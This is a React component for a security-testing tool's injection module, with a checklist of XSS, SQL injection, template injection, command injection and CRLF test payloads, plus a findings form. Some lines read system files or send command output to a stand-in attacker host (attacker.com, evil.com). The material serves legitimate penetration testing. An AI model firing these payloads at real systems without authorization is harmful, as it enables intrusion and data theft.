import { useState, useEffect } from "react";
import { ChevronDown, ChevronRight, AlertTriangle, CheckCircle, XCircle, ExternalLink, BookOpen, Beaker, Sparkles, Loader2, X } from "lucide-react";
import toast from "react-hot-toast";
import { fetchEndpoints, fetchLiveHosts, aiAdvisor } from "../../api";
import PayloadLibrary from "../PayloadLibrary";

const lessons = {
  what: "Injection attacks send untrusted data to an interpreter (SQL database, OS shell, template engine, JavaScript parser) where it gets executed as commands rather than data. Any user-controlled input that reaches a parser is a potential injection vector.",
  why: "A single SQL injection found Meta a $20,000 payout; stored XSS in Shopify admin earned $15,250. Injection flaws account for the highest average bounty payouts on HackerOne because they frequently lead to data exfiltration or remote code execution.",
  indicators: [
    "Reflection points — user input appears anywhere in the HTTP response",
    "Form fields whose values are sent to the server and processed server-side",
    "URL parameters that are echoed back in the page content",
    "Error messages revealing backend technology (MySQL syntax error, stack traces)",
    "Search fields, contact forms, login forms (highest probability)",
    "File upload, ping, DNS lookup, and other 'system utility' features",
  ],
  mistakes: [
    "Testing only GET parameters — POST body, HTTP headers, cookies, and JSON fields are all injectable",
    "Giving up after one payload — try multiple contexts and encodings",
    "Only testing reflected injection — stored injection is more severe",
  ],
};

const testItems = [
  { key: "xss_url_params", title: "Reflected XSS in URL Parameters", severity: "high",
    payloadCategory: "xss_reflected",
    instructions: "Target: {host}\nInject into every URL parameter:\n- <script>alert(1)</script>\n- <img src=x onerror=alert(1)>\n- \"><script>alert(1)</script>\n\nOpen the payload library for 15 XSS payloads across HTML, attribute, JS string, href, and SVG contexts." },
  { key: "xss_search", title: "Reflected XSS in Search Fields", severity: "high",
    payloadCategory: "xss_reflected",
    instructions: "Target: {host}\nFind search forms and submit XSS payloads:\n1. Locate search fields on the page\n2. Submit: <script>alert(1)</script>\n3. Check if the payload appears in the results page\n4. Try URL-encoded variants if blocked" },
  { key: "xss_stored_profile", title: "Stored XSS in Profile / Bio Fields", severity: "critical",
    payloadCategory: "xss_stored",
    instructions: "Target: {host}\n1. Go to your profile/settings page\n2. Inject into: name, bio, display name, website URL\n3. Use: <img src=x onerror=alert(1)>\n4. View your profile as another user\n5. If the script fires, stored XSS confirmed" },
  { key: "xss_stored_comments", title: "Stored XSS in Comment / Review Fields", severity: "critical",
    payloadCategory: "xss_stored",
    instructions: "Target: {host}\n1. Find any comment, review, or feedback form\n2. Submit: <script>alert(document.cookie)</script>\n3. Visit the page where comments are displayed\n4. Try: <svg onload=alert(1)> if scripts are stripped" },
  { key: "xss_headers", title: "XSS in HTTP Headers", severity: "medium",
    payloadCategory: "xss_reflected",
    instructions: "Target: {host}\nTest if HTTP headers are reflected in the response:\ncurl -H 'User-Agent: <script>alert(1)</script>' {host}\ncurl -H 'Referer: <script>alert(1)</script>' {host}\ncurl -H 'X-Forwarded-For: <script>alert(1)</script>' {host}\n\nAlso test: Cookie, Accept-Language, X-Real-IP" },
  { key: "sqli_login", title: "SQLi in Login (Username Field)", severity: "critical",
    payloadCategory: "sqli_error",
    instructions: "Target: {host}\nTest the login form:\n- Username: admin' OR '1'='1\n- Username: ' OR 1=1--\n- Username: admin'--\n- Password: anything (or ' OR '1'='1)\n\nOpen the payload library for 10 error-based SQLi payloads covering MySQL, MSSQL, and PostgreSQL." },
  { key: "sqli_search", title: "SQLi in Search / Filter Params", severity: "critical",
    payloadCategory: "sqli_error",
    instructions: "Target: {host}\nFind search, filter, or sort parameters:\n- ?search=test' OR 1=1--\n- ?category=1' UNION SELECT 1,2,3--\n- ?q=' OR '1'='1\n- ?sort=name' AND SLEEP(5)--\n\nLook for changes in response length or error messages." },
  { key: "sqli_id", title: "SQLi in ID Parameters", severity: "critical",
    payloadCategory: "sqli_error",
    instructions: "Target: {host}\nTest numeric ID parameters:\n- /item?id=1'\n- /user?id=2 OR 1=1\n- /product?id=1 UNION SELECT 1,2,3,4--\n- /api/v1/users/1' AND 1=1--\n\nBlind: /api/v1/users/1' AND SLEEP(5)--" },
  { key: "sqli_blind", title: "Blind SQLi with Time Delay", severity: "critical",
    payloadCategory: "sqli_blind",
    instructions: "Target: {host}\nWhen no error messages are visible, test time-based:\n- ' AND SLEEP(5)--\n- ' WAITFOR DELAY '0:0:5'--\n- ' AND 1=(SELECT sleep(5))--\n\nOpen the payload library for 8 blind SQLi payloads." },
  { key: "ssti", title: "SSTI in Name / Template Fields", severity: "critical",
    payloadCategory: "ssti",
    instructions: "Target: {host}\nTest template injection in fields that render user input:\n- Name field: {{7*7}}\n- Bio/template field: ${7*7}\n- Any field that supports formatting: #set($x=7*7)$x\n\nOpen the payload library for 12 SSTI payloads covering Jinja2, Twig, Freemarker, Velocity, Smarty, Jade, JSTL, Mako." },
  { key: "command_injection", title: "Command Injection in Ping / Host Fields", severity: "critical",
    payloadCategory: "ssrf_internal",
    instructions: "Target: {host}\nTest system command execution:\n- ; id\n- | whoami\n- && cat /etc/passwd\n- `hostname`\n- $(curl attacker.com/$(whoami))\n\nLook for: ping, nslookup, traceroute, dig, whois, convert, and other system-integrated features." },
  { key: "crlf", title: "CRLF Injection in Redirect Params", severity: "high",
    payloadCategory: "open_redirect",
    instructions: "Target: {host}\nTest CRLF injection in redirect/logging parameters:\n- %0d%0aSet-Cookie:+session=injected\n- %0d%0aLocation:+http://evil.com\n- %0d%0aX-XSS-Protection:+0\n\nAlso test in: User-Agent, Referer, and any parameter that appears in response headers." },
  { key: "html_injection", title: "HTML Injection in Email / Name Fields", severity: "medium",
    payloadCategory: "xss_reflected",
    instructions: "Target: {host}\nTest for HTML injection (no script execution but markup renders):\n- <h1>Injected</h1>\n- <marquee>XSS</marquee>\n- <b>bold</b><i>italic</i>\n- <img src=x>\n- <iframe src=//evil.com>\n\nHTML injection is less severe than XSS but still breaks integrity." },
  { key: "json_injection", title: "JSON Injection in API POST Bodies", severity: "medium",
    payloadCategory: "sqli_error",
    instructions: "Target: {host}\nTest JSON APIs for injection:\n1. Capture an API POST request\n2. Try injecting into string fields:\n   {\"name\": \"test' OR '1'='1\"}\n3. Try prototype pollution:\n   {\"__proto__\": {\"admin\": true}}\n4. Try type confusion:\n   {\"id\": \"1' UNION SELECT * FROM users--\"}\n\nCheck for 500 errors or unexpected behavior." },
];

function SeverityBadge({ severity }) {
  const colors = { critical: "#e05a4f", high: "#f0b429", medium: "#4a9eff", low: "#7c7e94" };
  const c = colors[severity] || colors.low;
  return <span className="text-[10px] uppercase font-semibold px-1.5 py-0.5 rounded"
    style={{ background: `${c}22`, color: c }}>{severity}</span>;
}

function CollapsibleLesson({ moduleName }) {
  const [open, setOpen] = useState(false);
  return (
    <div className="bg-surface-2 border border-border rounded-xl overflow-hidden">
      <button onClick={() => setOpen(!open)}
        className="w-full flex items-center justify-between px-4 py-3 text-xs font-medium text-text hover:bg-surface-2/80 transition-colors">
        <div className="flex items-center gap-2">
          <BookOpen size={14} className="text-accent" />
          Learn about this test type
        </div>
        {open ? <ChevronDown size={14} className="text-text-dim" /> : <ChevronRight size={14} className="text-text-dim" />}
      </button>
      {open && (
        <div className="px-4 pb-4 space-y-3 text-xs text-text-dim leading-relaxed">
          <div>
            <strong className="text-accent text-[11px]">What you're doing:</strong>
            <p className="mt-1">{lessons.what}</p>
          </div>
          <div>
            <strong className="text-accent text-[11px]">Why it matters:</strong>
            <p className="mt-1">{lessons.why}</p>
          </div>
          <div>
            <strong className="text-accent text-[11px]">What to look for:</strong>
            <ul className="list-disc list-inside mt-1 space-y-0.5">
              {lessons.indicators.map((item, i) => <li key={i}>{item}</li>)}
            </ul>
          </div>
          <div>
            <strong className="text-accent text-[11px]">Common mistakes:</strong>
            <ul className="list-disc list-inside mt-1 space-y-0.5">
              {lessons.mistakes.map((item, i) => <li key={i}>{item}</li>)}
            </ul>
          </div>
        </div>
      )}
    </div>
  );
}

function VerifyForm({ host, onSave, onBack }) {
  const [form, setForm] = useState({ url: "", request: "", response: "", steps: "", impact: "", severity: "critical", title: "" });

  const handleSave = () => {
    const finding = {
      ...form,
      title: form.title || `Injection finding on ${host}`,
      _ts: Date.now(),
      module: "Injection",
    };
    const storageKey = `findings_${location.pathname.match(/\d+/)?.[0] || "0"}`;
    try {
      const existing = JSON.parse(localStorage.getItem(storageKey) || "[]");
      existing.push(finding);
      localStorage.setItem(storageKey, JSON.stringify(existing));
    } catch {}
    onSave(finding);
    toast.success("Finding saved!");
    onBack();
  };

  return (
    <div className="space-y-3">
      <div className="flex items-center gap-2 text-yellow">
        <AlertTriangle size={14} />
        <span className="text-xs font-semibold text-text">Vulnerability Verified — Log Your Finding</span>
      </div>
      <div>
        <label className="text-[11px] text-text-dim block mb-1">Finding Title</label>
        <input value={form.title} onChange={(e) => setForm({ ...form, title: e.target.value })}
          placeholder="e.g. SQL Injection in /api/search endpoint"
          className="w-full bg-surface-2 border border-border rounded-lg px-3 py-2 text-sm text-text outline-none focus:border-accent" />
      </div>
      <div className="grid grid-cols-2 gap-3">
        <div>
          <label className="text-[11px] text-text-dim block mb-1">Affected URL</label>
          <input value={form.url} onChange={(e) => setForm({ ...form, url: e.target.value })}
            placeholder={host}
            className="w-full bg-surface-2 border border-border rounded-lg px-3 py-2 text-sm text-text outline-none focus:border-accent" />
        </div>
        <div>
          <label className="text-[11px] text-text-dim block mb-1">Severity</label>
          <select value={form.severity} onChange={(e) => setForm({ ...form, severity: e.target.value })}
            className="w-full bg-surface-2 border border-border rounded-lg px-3 py-2 text-sm text-text outline-none focus:border-accent">
            <option value="critical">Critical</option>
            <option value="high">High</option>
            <option value="medium">Medium</option>
            <option value="low">Low</option>
          </select>
        </div>
      </div>
      <div>
        <label className="text-[11px] text-text-dim block mb-1">Request</label>
        <textarea value={form.request} onChange={(e) => setForm({ ...form, request: e.target.value })} rows={3}
          className="w-full bg-surface-2 border border-border rounded-lg px-3 py-2 text-sm text-text outline-none focus:border-accent resize-none font-mono" />
      </div>
      <div>
        <label className="text-[11px] text-text-dim block mb-1">Response</label>
        <textarea value={form.response} onChange={(e) => setForm({ ...form, response: e.target.value })} rows={3}
          className="w-full bg-surface-2 border border-border rounded-lg px-3 py-2 text-sm text-text outline-none focus:border-accent resize-none font-mono" />
      </div>
      <div>
        <label className="text-[11px] text-text-dim block mb-1">Steps to Reproduce</label>
        <textarea value={form.steps} onChange={(e) => setForm({ ...form, steps: e.target.value })} rows={3}
          placeholder="1. Navigate to /api/search\n2. Submit query with payload: ' OR 1=1--\n3. Observe all records returned without authentication"
          className="w-full bg-surface-2 border border-border rounded-lg px-3 py-2 text-sm text-text outline-none focus:border-accent resize-none" />
      </div>
      <div>
        <label className="text-[11px] text-text-dim block mb-1">Impact</label>
        <textarea value={form.impact} onChange={(e) => setForm({ ...form, impact: e.target.value })} rows={2}
          placeholder="An attacker can extract the entire database, including user credentials and sensitive data"
          className="w-full bg-surface-2 border border-border rounded-lg px-3 py-2 text-sm text-text outline-none focus:border-accent resize-none" />
      </div>
      <div className="flex gap-2 pt-2">
        <button onClick={handleSave}
          className="px-4 py-2 bg-accent text-white text-xs font-medium rounded-lg hover:bg-accent-hover transition-colors">
          Save Finding
        </button>
        <button onClick={onBack}
          className="px-4 py-2 bg-surface-2 text-text-dim text-xs font-medium rounded-lg hover:text-text transition-colors">
          Back
        </button>
      </div>
    </div>
  );
}

export default function InjectionModule({ host, targetId, onBack }) {
  const [tab, setTab] = useState("discover");
  const [endpoints, setEndpoints] = useState([]);
  const [discoverResults, setDiscoverResults] = useState(null);
  const [tests, setTests] = useState(() => {
    try {
      return JSON.parse(localStorage.getItem(`injection_tests_${host}`) || "{}");
    } catch { return {}; }
  });
  const [showVerify, setShowVerify] = useState(null);
  const [showPayloadLib, setShowPayloadLib] = useState(null);
  const [aiSuggestions, setAiSuggestions] = useState(null);
  const [aiLoading, setAiLoading] = useState(false);
  const [liveHostId, setLiveHostId] = useState(null);

  useEffect(() => {
    fetchEndpoints(targetId, { size: 500 }).then((r) => {
      setEndpoints(r.items || []);
      analyzeSurface(r.items || []);
    }).catch(() => {});
    fetchLiveHosts(targetId, { size: 100 }).then((r) => {
      const match = (r.items || []).find((h) => h.url?.includes(host.replace(/^https?:\/\//, "").split("/")[0]));
      if (match) setLiveHostId(match.id);
    }).catch(() => {});
  }, [targetId]);

  function analyzeSurface(eps) {
    const urls = eps.map((e) => e.url || "");
    const hostUrls = urls.filter((u) => u.toLowerCase().includes(host.toLowerCase()));
    const allPaths = [...new Set(hostUrls.map((u) => {
      try { return new URL(u).pathname + new URL(u).search; } catch { return u; }
    }))];
    const withParams = allPaths.filter((p) => p.includes("?")).length;
    const formEndpoints = allPaths.filter((p) => /search|query|login|contact|form|feedback|comment/i.test(p)).length;
    const totalForms = urls.filter((u) => /form|input|textarea/i.test(u)).length;
    setDiscoverResults({ totalPaths: allPaths.length, withParams, formEndpoints, totalForms });
  }

  function toggleTest(key) {
    const updated = { ...tests, [key]: { ...tests[key], done: !tests[key]?.done } };
    setTests(updated);
    localStorage.setItem(`injection_tests_${host}`, JSON.stringify(updated));
  }

  function markVulnerable(key) {
    setShowVerify(key);
  }

  function openPayloadLib(category) {
    setShowPayloadLib(category);
  }

  async function handleAiSuggestions() {
    if (!liveHostId) { toast.error("Could not identify live host for this target"); return; }
    setAiLoading(true);
    setAiSuggestions(null);
    try {
      const result = await aiAdvisor(targetId, { live_host_id: liveHostId, module: "injection" });
      setAiSuggestions(result.suggestions || []);
      if (!result.suggestions?.length) toast.success("No AI suggestions available");
      else toast.success(`Got ${result.suggestions.length} suggestions`);
    } catch (e) { toast.error(e.message); }
    finally { setAiLoading(false); }
  }

  function getProgress() {
    const total = testItems.length;
    const done = Object.values(tests).filter((t) => t.done).length;
    return { total, done, pct: total > 0 ? Math.round((done / total) * 100) : 0 };
  }

  const { done, total, pct } = getProgress();

  return (
    <div className="space-y-4">
      <CollapsibleLesson moduleName="injection" />

      <div className="flex gap-1 border-b border-border">
        {["discover", "test", "verify"].map((t) => {
          const labels = { discover: "Discover", test: "Test", verify: "Verify" };
          const icons = { discover: "🔍", test: "🧪", verify: "📋" };
          const active = tab === t;
          return (
            <button key={t} onClick={() => setTab(t)}
              className={`flex items-center gap-1.5 px-3 py-2 text-xs font-medium border-b-2 transition-all ${active ? "border-accent text-accent" : "border-transparent text-text-dim hover:text-text"}`}>
              <span>{icons[t]}</span> {labels[t]}
            </button>
          );
        })}
      </div>

      {tab === "discover" && (
        <div className="space-y-4">
          <p className="text-xs text-text-dim">Injection surface detected from scanned endpoints for this host.</p>
          <div className="grid grid-cols-3 gap-2">
            <div className={`px-3 py-2 rounded-lg border text-xs text-center ${discoverResults?.withParams > 0 ? "bg-green-subtle border-green/30 text-green" : "bg-surface-2 border-border text-text-dim"}`}>
              <div className="font-medium">{discoverResults?.withParams || 0}</div>
              <div className="text-[10px] mt-0.5">URLs with params</div>
            </div>
            <div className={`px-3 py-2 rounded-lg border text-xs text-center ${discoverResults?.formEndpoints > 0 ? "bg-green-subtle border-green/30 text-green" : "bg-surface-2 border-border text-text-dim"}`}>
              <div className="font-medium">{discoverResults?.formEndpoints || 0}</div>
              <div className="text-[10px] mt-0.5">Form endpoints</div>
            </div>
            <div className="px-3 py-2 rounded-lg border text-xs text-center bg-surface-2 border-border text-text-dim">
              <div className="font-medium">{discoverResults?.totalPaths || 0}</div>
              <div className="text-[10px] mt-0.5">Total paths</div>
            </div>
          </div>
          {discoverResults?.withParams > 0 && (
            <div className="bg-green-subtle/10 border border-green/20 rounded-lg p-3 text-xs text-text-dim">
              <strong className="text-green">Injection surface found:</strong> {discoverResults.withParams} URLs accept parameters and {discoverResults.formEndpoints} form-related endpoints detected. Move to Test to begin injecting payloads.
            </div>
          )}
          {(!discoverResults || discoverResults.withParams === 0) && (
            <div className="bg-accent-subtle/30 border border-accent/20 rounded-lg p-3 text-xs text-text-dim">
              <strong className="text-accent">No injection surface detected yet.</strong> Run a full scan (Phase 4 — Content Discovery) to find more endpoints, or proceed to Test and test manually.
            </div>
          )}
        </div>
      )}

      {tab === "test" && showPayloadLib && (
        <div className="space-y-3">
          <button onClick={() => setShowPayloadLib(null)}
            className="inline-flex items-center gap-1.5 text-xs text-text-dim hover:text-text transition-colors">
            <ChevronRight size={14} className="rotate-180" />
            Back to tests
          </button>
          <PayloadLibrary
            category={showPayloadLib}
            targetUrl={`http://${host}`}
            onClose={() => setShowPayloadLib(null)}
          />
        </div>
      )}

      {tab === "test" && showVerify && !showPayloadLib && (
        <VerifyForm host={host} onSave={() => setShowVerify(null)} onBack={() => setShowVerify(null)} />
      )}

      {tab === "test" && !showVerify && !showPayloadLib && (
        <div className="space-y-2">
          <div className="flex items-center justify-between text-xs text-text-dim mb-2">
            <span>{done}/{total} tests completed</span>
            <div className="flex items-center gap-2">
              <span>{pct}%</span>
              <button onClick={handleAiSuggestions} disabled={aiLoading}
                className="flex items-center gap-1 px-2 py-1 rounded-lg bg-accent-subtle text-accent text-[10px] font-medium hover:bg-accent/20 disabled:opacity-50 transition-colors">
                {aiLoading ? <Loader2 size={11} className="animate-spin" /> : <Sparkles size={11} />}
                {aiLoading ? "Loading..." : "Get AI Suggestions"}
              </button>
            </div>
          </div>
          <div className="h-1.5 bg-surface-2 rounded-full overflow-hidden">
            <div className="h-full bg-accent rounded-full transition-all duration-300" style={{ width: `${pct}%` }} />
          </div>
          {aiSuggestions && aiSuggestions.length > 0 && (
            <div className="border border-accent/20 bg-accent-subtle/10 rounded-lg p-3 space-y-2">
              <div className="flex items-center justify-between">
                <span className="text-xs font-medium text-accent flex items-center gap-1"><Sparkles size={12} /> AI Suggestions</span>
                <button onClick={() => setAiSuggestions(null)} className="text-text-dim hover:text-text p-0.5"><X size={12} /></button>
              </div>
              {aiSuggestions.map((s, i) => (
                <div key={i} className="text-xs text-text-dim border-b border-border/50 last:border-0 pb-2 last:pb-0">
                  <div className="font-medium text-text">{s.test}</div>
                  <div className="text-[11px] mt-0.5">{s.reason}</div>
                  {s.specific_url && <div className="text-[10px] font-mono text-accent mt-0.5">URL: {s.specific_url}</div>}
                  {s.payload_hint && <div className="text-[10px] font-mono text-yellow mt-0.5">Payload: {s.payload_hint}</div>}
                </div>
              ))}
            </div>
          )}
          {testItems.map((item) => {
            const state = tests[item.key] || {};
            return (
              <div key={item.key}
                className={`border rounded-lg transition-colors ${state.done ? "border-green/30 bg-green-subtle/10" : "border-border bg-surface-2"}`}>
                <div className="flex items-start gap-3 p-3">
                  <input type="checkbox" checked={!!state.done}
                    onChange={() => toggleTest(item.key)}
                    className="mt-0.5 accent-accent w-4 h-4 rounded border-border" />
                  <div className="flex-1 min-w-0">
                    <div className="flex items-center gap-2">
                      <span className="text-xs font-medium text-text">{item.title}</span>
                      <SeverityBadge severity={item.severity} />
                    </div>
                    <details className="mt-1.5">
                      <summary className="text-[11px] text-accent cursor-pointer hover:underline">View instructions</summary>
                      <pre className="mt-2 text-[11px] text-text-dim bg-surface border border-border rounded-lg p-3 overflow-x-auto whitespace-pre-wrap font-mono">
                        {item.instructions.replace(/\{host\}/g, host)}
                      </pre>
                    </details>
                    {item.payloadCategory && (
                      <button onClick={() => openPayloadLib(item.payloadCategory)}
                        className="mt-1.5 inline-flex items-center gap-1 px-2 py-1 rounded text-[10px] font-medium bg-accent-subtle text-accent hover:bg-accent/20 transition-colors">
                        <Beaker size={11} />
                        Payload Library ({item.payloadCategory.replace(/_/g, " ")})
                      </button>
                    )}
                  </div>
                  <button onClick={() => markVulnerable(item.key)}
                    className="shrink-0 px-2 py-1 rounded text-[10px] font-medium bg-red-subtle text-red hover:bg-red/20 transition-colors">
                    Mark Vulnerable
                  </button>
                </div>
              </div>
            );
          })}
        </div>
      )}

      {tab === "verify" && (
        <div className="space-y-4">
          <p className="text-xs text-text-dim">Items you marked as vulnerable. Fill in details to save as a finding.</p>
          {Object.keys(tests).some((k) => tests[k]?.vulnerable) ? (
            <div className="space-y-2">
              {testItems.filter((item) => tests[item.key]?.vulnerable).map((item) => (
                <div key={item.key}
                  className="bg-yellow-subtle/10 border border-yellow/30 rounded-lg p-3 flex items-center justify-between">
                  <div>
                    <div className="text-xs font-medium text-text">{item.title}</div>
                    <SeverityBadge severity={item.severity} />
                  </div>
                  <button onClick={() => setShowVerify(item.key)}
                    className="px-3 py-1.5 bg-accent text-white text-xs font-medium rounded-lg hover:bg-accent-hover transition-colors">
                    Document
                  </button>
                </div>
              ))}
            </div>
          ) : (
            <div className="text-center py-8">
              <p className="text-xs text-text-dim">No vulnerabilities marked yet.</p>
              <p className="text-[11px] text-text-dim/60 mt-1">Go to the Test tab and click "Mark Vulnerable" on any test item.</p>
            </div>
          )}
        </div>
      )}
    </div>
  );
}
